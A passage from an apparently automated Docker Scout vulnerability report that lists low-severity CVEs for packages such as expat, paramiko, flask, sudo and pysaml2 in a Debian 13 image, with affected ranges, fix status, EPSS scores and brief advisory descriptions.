<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>expat</strong> <code>2.7.1-2</code> (deb)</summary>

<small><code>pkg:deb/debian/expat@2.7.1-2?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-45186?s=debian&n=expat&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2026--45186" src="https://img.shields.io/badge/CVE--2026--45186-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.004%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In libexpat before 2.8.1, the computational complexity of attribute name collision checks allows a denial of service via moderately sized crafted XML input.

---
- expat 2.8.0-2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1136164)
https://github.com/libexpat/libexpat/pull/1216
https://blog.hartwork.org/posts/expat-2-8-1-released/

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>paramiko</strong> <code>3.4.1</code> (pypi)</summary>

<small><code>pkg:pypi/paramiko@3.4.1</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-44405?s=github&n=paramiko&t=pypi&vr=%3C%3D4.0.0"><img alt="low 3.4: CVE--2026--44405" src="https://img.shields.io/badge/CVE--2026--44405-lightgrey?label=low%203.4&labelColor=fce1a9"/></a> <i>Use of a Broken or Risky Cryptographic Algorithm</i>

<table>
<tr><td>Affected range</td><td><code><=4.0.0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>3.4</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.004%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In Paramiko through 4.0.0 before a448945, rsakey.py allows the SHA-1 algorithm.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>perl</strong> <code>5.40.1-6</code> (deb)</summary>

<small><code>pkg:deb/debian/perl@5.40.1-6?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2011-4116?s=debian&n=perl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2011--4116" src="https://img.shields.io/badge/CVE--2011--4116-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.189%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>40th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

_is_safe in the File::Temp module for Perl does not properly handle symlinks.

---
- perl <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=776268)
http://thread.gmane.org/gmane.comp.security.oss.general/6174/focus=6177
https://github.com/Perl-Toolchain-Gang/File-Temp/issues/14

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>apt</strong> <code>3.0.3</code> (deb)</summary>

<small><code>pkg:deb/debian/apt@3.0.3?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2011-3374?s=debian&n=apt&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2011--3374" src="https://img.shields.io/badge/CVE--2011--3374-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.509%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>81st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

It was found that apt-key in apt, all versions, do not correctly validate gpg keys with the master keyring, leading to a potential man-in-the-middle attack.

---
- apt <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=642480)
Not exploitable in Debian, since no keyring URI is defined

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>flask</strong> <code>2.3.2</code> (pypi)</summary>

<small><code>pkg:pypi/flask@2.3.2</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-27205?s=github&n=flask&t=pypi&vr=%3C3.1.3"><img alt="low 2.3: CVE--2026--27205" src="https://img.shields.io/badge/CVE--2026--27205-lightgrey?label=low%202.3&labelColor=fce1a9"/></a> <i>Use of Cache Containing Sensitive Information</i>

<table>
<tr><td>Affected range</td><td><code><3.1.3</code></td></tr>
<tr><td>Fixed version</td><td><code>3.1.3</code></td></tr>
<tr><td>CVSS Score</td><td><code>2.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.013%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When the `session` object is accessed, Flask should set the `Vary: Cookie` header. This instructs caches not to cache the response, as it may contain information specific to a logged in user. This is handled in most cases, but some forms of access such as the Python `in` operator were overlooked.

The severity depends on the application's use of the session, and the cache's behavior regarding cookies. The risk depends on all these conditions being met.

1. The application must be hosted behind a caching proxy that does not ignore responses with cookies.
2. The application does not set a `Cache-Control` header to indicate that a page is private or should not be cached.
3. The application accesses the session in a way that does not access the values, only the keys, and does not mutate the session.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>sudo</strong> <code>1.9.16p2-3+deb13u2</code> (deb)</summary>

<small><code>pkg:deb/debian/sudo@1.9.16p2-3%2Bdeb13u2?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2005-1119?s=debian&n=sudo&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2005--1119" src="https://img.shields.io/badge/CVE--2005--1119-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.075%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Sudo VISudo 1.6.8 and earlier allows local users to corrupt arbitrary files via a symlink attack on temporary files.

---
- sudo <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=283161; unimportant)
That's a policy violation, but not a security problem

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>unixodbc</strong> <code>2.3.12-2</code> (deb)</summary>

<small><code>pkg:deb/debian/unixodbc@2.3.12-2?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-1013?s=debian&n=unixodbc&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2024--1013" src="https://img.shields.io/badge/CVE--2024--1013-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.069%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An out-of-bounds stack write flaw was found in unixODBC on 64-bit architectures where the caller has 4 bytes and callee writes 8 bytes. This issue may go unnoticed on little-endian architectures, while big-endian architectures can be broken.

---
- unixodbc 2.3.14-1 (unimportant)
https://github.com/lurcher/unixODBC/pull/157
Fixed by: https://github.com/lurcher/unixODBC/commit/45f501e1be2db6b017cc242c79bfb9de32b332a1 (v2.3.13)
Only affects example code, not present in binary packages

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>shadow</strong> <code>1:4.17.4-2</code> (deb)</summary>

<small><code>pkg:deb/debian/shadow@1%3A4.17.4-2?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2007-5686?s=debian&n=shadow&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2007--5686" src="https://img.shields.io/badge/CVE--2007--5686-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.322%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>55th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

initscripts in rPath Linux 1 sets insecure permissions for the /var/log/btmp file, which allows local users to obtain sensitive information regarding authentication attempts.  NOTE: because sshd detects the insecure permissions and does not log certain events, this also prevents sshd from logging failed authentication attempts by remote attackers.

---
- shadow <unfixed> (unimportant)
See #290803, on Debian LOG_UNKFAIL_ENAB in login.defs is set to no so
unknown usernames are not recorded on login failures

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>jansson</strong> <code>2.14-2</code> (deb)</summary>

<small><code>pkg:deb/debian/jansson@2.14-2?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2020-36325?s=debian&n=jansson&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2020--36325" src="https://img.shields.io/badge/CVE--2020--36325-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.659%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>71st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in Jansson through 2.13.1. Due to a parsing error in json_loads, there's an out-of-bounds read-access bug. NOTE: the vendor reports that this only occurs when a programmer fails to follow the API specification

---
- jansson <unfixed> (unimportant)
https://github.com/akheron/jansson/issues/548
Disputed security impact (only if programmer fails to follow API specifications)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>libxslt</strong> <code>1.1.35-1.2+deb13u3</code> (deb)</summary>

<small><code>pkg:deb/debian/libxslt@1.1.35-1.2%2Bdeb13u3?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2015-9019?s=debian&n=libxslt&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2015--9019" src="https://img.shields.io/badge/CVE--2015--9019-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.595%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>69th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In libxslt 1.1.29 and earlier, the EXSLT math.random function was not initialized with a random seed during startup, which could cause usage of this function to produce predictable outputs.

---
- libxslt <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=859796)
https://bugzilla.gnome.org/show_bug.cgi?id=758400
https://bugzilla.suse.com/show_bug.cgi?id=934119
There's no indication that math.random() in intended to ensure cryptographic
randomness requirements. Proper seeding needs to happen in the application
using libxslt.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <img alt="unspecified: 1" src="https://img.shields.io/badge/U-1-lightgrey"/><strong>pysaml2</strong> <code>7.3.1</code> (pypi)</summary>

<small><code>pkg:pypi/pysaml2@7.3.1</code></small><br/>
<a href="https://scout.docker.com/v/GMS-2016-67?s=gitlab&n=pysaml2&t=pypi&vr=%3E%3D0.0.0"><img alt="unspecified : GMS--2016--67" src="https://img.shields.io/badge/GMS--2016--67-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> <i>OWASP Top Ten 2017 Category A9 - Using Components with Known Vulnerabilities</i>

<table>
<tr><td>Affected range</td><td><code>>=0.0.0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

PySAML2 is vulnerable to XML External Entity attacks (XEE attacks) via SAML XML requests.

</blockquote>
</details>
</details></td></tr>
</table>

